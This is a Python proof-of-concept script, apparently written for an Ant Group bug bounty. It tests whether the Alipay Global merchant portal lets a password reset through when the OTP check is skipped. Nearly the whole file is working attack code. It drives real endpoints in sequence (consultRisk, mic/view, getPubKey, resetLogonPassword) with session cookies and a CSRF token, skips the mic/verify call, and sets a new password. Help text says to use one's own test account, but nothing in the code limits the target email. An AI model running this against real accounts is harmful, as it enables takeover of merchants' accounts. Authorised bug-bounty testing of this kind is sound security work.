#!/usr/bin/env python3
"""
PoC: OTP Bypass in Password Reset Flow — Alipay Global Merchant Portal
Target: global.alipay.com
Bug Bounty: Ant Group Security Response Center

Vulnerability hypothesis:
  After consultRisk issues a verifyId, the server may NOT validate that
  OTP verification actually succeeded before allowing resetLogonPassword.
  A client-side-only check (response tampering) would then be enough
  to reset any account's password.

Flow:
  Step 1  captcha          → obtain antCaptchaToken   (optional, browser)
  Step 2  checkEmail       → validate email exists     (optional, browser)
  Step 3  consultRisk      → obtain verifyId + securityId
  Step 4  mic/view         → trigger OTP email send
  Step 5  mic/verify       → **SKIPPED** (bypass) or real OTP
  Step 6  getPubKey        → RSA public key + salt + uid
  Step 7  resetLogonPassword → attempt password reset

Usage:
  # Bypass mode — skip OTP verification entirely
  python3 otp_bypass_reset_poc.py \
      --email "you@yeswehack.ninja" \
      --password "NewP@ssw0rd123" \
      --ctoken "<ctoken>" \
      --cookies cookies.json

  # Normal mode — supply the real OTP for baseline comparison
  python3 otp_bypass_reset_poc.py \
      --email "you@yeswehack.ninja" \
      --password "NewP@ssw0rd123" \
      --ctoken "<ctoken>" \
      --cookies cookies.json \
      --otp 123456

cookies.json example:
  {
    "JSESSIONID": "...",
    "ALIPAYINTLJSESSIONID": "...",
    "ALIPAYJSESSIONID": "...",
    "ctoken": "...",
    "tntInstId": "ALIPW3SG",
    "intl_locale": "en_US",
    "session.cookieNameId": "ALIPAYINTLJSESSIONID",
    "_region": "QK"
  }
"""

import argparse
import base64
import json
import sys
import time
from urllib.parse import quote

import requests
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.serialization import load_der_public_key

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
BASE_URL = "https://global.alipay.com"
CAPTCHA_HOST = "https://iantcaptchaqk.alipay.com"
IDENTITY_HOST = "https://ifcidentitycloudqk.alipay.com"

COMMON_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/144.0.0.0 Safari/537.36"
    ),
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Not(A:Brand";v="8", "Chromium";v="144"',
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Ch-Ua-Mobile": "?0",
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def encrypt_password(password: str, public_key_b64: str, salt: str) -> str:
    """RSA-PKCS1v15 encrypt  salt+password  with the server's public key."""
    pub_der = base64.b64decode(public_key_b64)
    pub_key = load_der_public_key(pub_der)
    plaintext = (salt + password).encode("utf-8")
    ciphertext = pub_key.encrypt(plaintext, asym_padding.PKCS1v15())
    return base64.b64encode(ciphertext).decode("utf-8")


def api_headers(ctoken: str, referer: str, *, accept: str = "application/json",
                content_type: str | None = "application/json;charset=UTF-8") -> dict:
    """Build headers for global.alipay.com API calls."""
    h = {
        **COMMON_HEADERS,
        "Accept": accept,
        "Ctoken": ctoken,
        "Bx-V": "2.5.36",
        "Origin": BASE_URL,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": referer,
    }
    if content_type:
        h["Content-Type"] = content_type
    return h


def identity_headers() -> dict:
    """Build headers for ifcidentitycloudqk.alipay.com calls."""
    return {
        **COMMON_HEADERS,
        "Accept": "*/*",
        "Origin": "https://render.antfin.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://render.antfin.com/",
    }


def log(step: str, msg: str) -> None:
    print(f"[{step}] {msg}")


def dump_json(data: dict) -> None:
    print(json.dumps(data, indent=2))


# ---------------------------------------------------------------------------
# PoC class
# ---------------------------------------------------------------------------
class OTPBypassPoC:
    def __init__(self, email: str, new_password: str, ctoken: str,
                 cookies: dict, route: str = "QK"):
        self.email = email
        self.new_password = new_password
        self.ctoken = ctoken
        self.route = route

        self.sess = requests.Session()
        self.sess.cookies.update(cookies)

        # State populated during the flow
        self.verify_id: str | None = None
        self.security_id: str | None = None
        self.uid: str | None = None
        self.public_key: str | None = None
        self.salt: str | None = None

    # ---- Step 2 (optional) ------------------------------------------------
    def step2_check_email(self, captcha_token: str, biz_no: str) -> bool:
        """checkEmail — needs a valid captcha token + bizNo from Step 1."""
        log("2", "checkEmail …")
        url = (f"{BASE_URL}/merchant/proxyapi/member/checkEmail.json"
               f"?_route={self.route}&ctoken={self.ctoken}")
        referer = (f"{BASE_URL}/merchant/portal/account/forget"
                   f"?_route={self.route}")
        payload = {
            "email": self.email,
            "antCaptchaToken": captcha_token,
            "bizNo": biz_no,
            "rdsAppId": "imhome_resetLoginPwd_qk",
        }
        resp = self.sess.post(url, json=payload,
                              headers=api_headers(self.ctoken, referer),
                              timeout=15)
        data = resp.json()
        log("2", f"HTTP {resp.status_code}")
        dump_json(data)
        ok = data.get("success") and data.get("data", {}).get("validated")
        log("2", "[+] Email validated" if ok else "[-] checkEmail failed")
        return bool(ok)

    # ---- Step 3 -----------------------------------------------------------
    def step3_consult_risk(self) -> bool:
        """consultRisk — obtain verifyId + securityId."""
        log("3", "consultRisk …")
        url = (f"{BASE_URL}/merchant/proxyapi/member/consultRisk.json"
               f"?_route={self.route}&ctoken={self.ctoken}")
        referer = (
            f"{BASE_URL}/merchant/portal/account/security/"
            f"{quote(self.email)}?_route={self.route}"
            f"&featureCode=findLogonPassword"
        )
        resp = self.sess.post(url, json={"scene": "FIND_LOGON_PASSWORD"},
                              headers=api_headers(self.ctoken, referer),
                              timeout=15)
        data = resp.json()
        log("3", f"HTTP {resp.status_code}")
        dump_json(data)

        if not data.get("success"):
            log("3", "[-] consultRisk failed")
            return False

        self.verify_id = data["data"]["verifyId"]
        self.security_id = data["data"]["securityId"]
        log("3", f"[+] verifyId   = {self.verify_id}")
        log("3", f"[+] securityId = {self.security_id}")
        return True

    # ---- Step 4 -----------------------------------------------------------
    def step4_initiate_otp(self) -> bool:
        """mic/view — trigger the OTP email so the server creates a pending
        verification record for our verifyId."""
        log("4", "Initiating OTP send (mic/view) …")
        url = f"{IDENTITY_HOST}/api/mic/view"
        params = {
            "productCode": "otpEmail",
            "verifyId": self.verify_id,
            "_output_charset": "utf-8",
            "_input_charset": "utf-8",
        }
        resp = self.sess.get(url, params=params,
                             headers=identity_headers(), timeout=15)
        data = resp.json()
        log("4", f"HTTP {resp.status_code}")
        log("4", f"resultCode = {data.get('resultCode')}")
        log("4", f"message    = {data.get('resultMessage')}")

        if data.get("success"):
            log("4", "[+] OTP email triggered")
            return True
        log("4", "[-] OTP trigger failed")
        dump_json(data)
        return False

    # ---- Step 5 -----------------------------------------------------------
    def step5_verify_otp(self, otp_code: str | None) -> bool:
        """mic/verify — either supply a real OTP or **skip entirely**
        (the bypass under test)."""
        if otp_code is None:
            log("5", "*** SKIPPING OTP verification (bypass mode) ***")
            log("5", "    Testing whether server enforces OTP before reset …")
            return True  # intentionally skip

        log("5", f"Verifying OTP = {otp_code} …")
        url = f"{IDENTITY_HOST}/api/mic/verify"
        params = {
            "data": otp_code,
            "productCode": "otpEmail",
            "verifyId": self.verify_id,
            "_output_charset": "utf-8",
            "_input_charset": "utf-8",
        }
        resp = self.sess.get(url, params=params,
                             headers=identity_headers(), timeout=15)
        data = resp.json()
        log("5", f"HTTP {resp.status_code}")
        dump_json(data)

        if data.get("verifySuccess"):
            log("5", "[+] OTP verified successfully")
            return True

        log("5", "[-] OTP verification failed")
        return False

    # ---- Step 6 -----------------------------------------------------------
    def step6_get_pubkey(self) -> bool:
        """getPubKey — RSA public key used to encrypt the new password."""
        log("6", "Fetching public key …")
        url = (f"{BASE_URL}/merchant/proxyapi/member/getPubKey.json"
               f"?_route={self.route}&ctoken={self.ctoken}")
        referer = (
            f"{BASE_URL}/merchant/portal/account/set-login-pwd/"
            f"{quote(self.email)}?_route={self.route}"
        )
        headers = api_headers(self.ctoken, referer, accept="*/*",
                              content_type=None)
        resp = self.sess.get(url, headers=headers, timeout=15)
        data = resp.json()
        log("6", f"HTTP {resp.status_code}")

        if not data.get("success"):
            log("6", "[-] getPubKey failed")
            dump_json(data)
            return False

        self.public_key = data["data"]["publicKey"]
        self.salt = data["data"]["salt"]
        self.uid = data["data"]["uid"]
        log("6", f"[+] publicKey = {self.public_key[:40]}…")
        log("6", f"[+] salt      = {self.salt}")
        log("6", f"[+] uid       = {self.uid}")
        return True

    # ---- Step 7 -----------------------------------------------------------
    def step7_reset_password(self) -> bool:
        """resetLogonPassword — the critical step.  If this succeeds
        WITHOUT a valid OTP verification (step 5 skipped), the server
        is vulnerable."""
        log("7", "Attempting password reset …")

        encrypted_pw = encrypt_password(
            self.new_password, self.public_key, self.salt
        )
        log("7", f"Encrypted password ({len(encrypted_pw)} chars)")

        url = (
            f"{BASE_URL}/merchant/merchantservice/api/account/"
            f"resetLogonPassword.json?_route={self.route}&ctoken={self.ctoken}"
        )
        referer = (
            f"{BASE_URL}/merchant/portal/account/set-login-pwd/"
            f"{quote(self.email)}?_route={self.route}"
        )
        payload = {
            "encryptedQueryPassword": encrypted_pw,
            "uid": self.uid,
            "verifyId": self.verify_id,
            "securityId": self.security_id,
            "verifyProductCode": "otpEmail",
        }

        resp = self.sess.post(url, json=payload,
                              headers=api_headers(self.ctoken, referer),
                              timeout=15)
        data = resp.json()
        log("7", f"HTTP {resp.status_code}")
        dump_json(data)

        if data.get("success"):
            log("7", "")
            log("7", "!!! PASSWORD RESET SUCCEEDED !!!")
            log("7", "The server did NOT enforce OTP verification.")
            return True

        log("7", "")
        log("7", "Password reset REJECTED by server.")
        error_code = data.get("errorCode") or data.get("resultCode") or "N/A"
        error_msg = data.get("errorMsg") or data.get("resultMessage") or "N/A"
        log("7", f"Error code : {error_code}")
        log("7", f"Error msg  : {error_msg}")
        return False

    # ---- Orchestrator -----------------------------------------------------
    def run(self, otp_code: str | None = None,
            captcha_token: str | None = None,
            biz_no: str | None = None) -> bool:
        mode = "BYPASS (no OTP)" if otp_code is None else f"NORMAL (OTP={otp_code})"
        print("=" * 70)
        print("PoC: OTP Bypass in Password Reset Flow")
        print(f"  Target : {BASE_URL}")
        print(f"  Email  : {self.email}")
        print(f"  Mode   : {mode}")
        print("=" * 70)

        # Optional Step 2
        if captcha_token and biz_no:
            if not self.step2_check_email(captcha_token, biz_no):
                return False
        else:
            log("2", "(skipped — start forgot-password in browser first)")

        # Step 3
        if not self.step3_consult_risk():
            log("!", "Aborted at step 3.  Make sure you completed the "
                "forgot-password flow in your browser first (steps 1-2).")
            return False

        # Step 4 — trigger OTP send so a verification record exists
        if not self.step4_initiate_otp():
            log("!", "Aborted at step 4")
            return False

        # Step 5 — bypass or real OTP
        if not self.step5_verify_otp(otp_code):
            log("!", "OTP verification failed (step 5)")
            return False

        # Small pause to mimic browser navigation
        time.sleep(1)

        # Step 6
        if not self.step6_get_pubkey():
            log("!", "Aborted at step 6")
            return False

        # Step 7
        success = self.step7_reset_password()

        print()
        print("=" * 70)
        if otp_code is None:
            if success:
                print("RESULT: VULNERABLE — password was reset without OTP.")
            else:
                print("RESULT: Server correctly rejected the reset without OTP.")
        else:
            print(f"RESULT: {'Password reset succeeded.' if success else 'Password reset failed.'}")
        print("=" * 70)
        return success


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    p = argparse.ArgumentParser(
        description="PoC: OTP Bypass in Password Reset — Alipay Global Merchant Portal",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Prerequisites:
  1. Open the forgot-password page in your browser and enter your email.
  2. Copy your session cookies into a JSON file (see --cookies).
  3. Copy the ctoken value (visible in cookies or request headers).

Bypass mode (default):
  python3 %(prog)s --email YOU@example.com --password 'New!' --ctoken TOKEN --cookies cookies.json

Normal mode (baseline comparison):
  python3 %(prog)s --email YOU@example.com --password 'New!' --ctoken TOKEN --cookies cookies.json --otp 123456
""",
    )
    p.add_argument("--email", required=True,
                   help="Target email (your own test account)")
    p.add_argument("--password", required=True,
                   help="New password to set")
    p.add_argument("--ctoken", required=True,
                   help="CSRF token from session cookies/headers")
    p.add_argument("--cookies", required=True,
                   help="Path to a JSON file with session cookies")
    p.add_argument("--otp", default=None,
                   help="Real OTP code (omit to test the bypass)")
    p.add_argument("--route", default="QK",
                   help="Route parameter (default: QK)")
    p.add_argument("--captcha-token", default=None,
                   help="Optional: captcha token from Step 1")
    p.add_argument("--biz-no", default=None,
                   help="Optional: bizNo from Step 1")

    args = p.parse_args()

    try:
        with open(args.cookies, "r") as f:
            cookies = json.load(f)
    except FileNotFoundError:
        # Also accept inline JSON
        try:
            cookies = json.loads(args.cookies)
        except json.JSONDecodeError:
            print(f"[!] Cannot read cookies file: {args.cookies}")
            sys.exit(1)
    except json.JSONDecodeError:
        print(f"[!] Invalid JSON in {args.cookies}")
        sys.exit(1)

    poc = OTPBypassPoC(
        email=args.email,
        new_password=args.password,
        ctoken=args.ctoken,
        cookies=cookies,
        route=args.route,
    )

    success = poc.run(
        otp_code=args.otp,
        captcha_token=args.captcha_token,
        biz_no=args.biz_no,
    )
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
